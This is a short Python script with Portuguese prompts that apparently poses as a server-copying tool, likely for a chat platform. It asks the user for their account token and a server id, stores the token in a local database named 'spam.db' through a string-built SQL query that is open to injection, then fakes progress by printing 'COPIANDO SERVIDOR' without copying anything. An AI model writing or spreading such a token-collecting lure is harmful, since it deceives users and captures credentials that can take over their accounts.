import sqlite3
import time
toke = input("Digite seu token: ")
ler = len(toke)
id = input("Digite o id do sv a ser copiado: ")
sv = input("Digite o sv a ser colado: ")
banco = sqlite3.connect('spam.db')
if ler <= 7:
        print("TOKEN INVALIDO")
        exit()
else:
        print("Token valido")

cursor = banco.cursor()

#cursor.execute('CREATE TABLE tokens (token text)')

cursor.execute(f"INSERT INTO tokens VALUES('{toke}')")

banco.commit()

cursor.execute("SELECT * FROM tokens")

for p in range(0, 40):
        time.sleep(3)
        print("COPIANDO SERVIDOR")
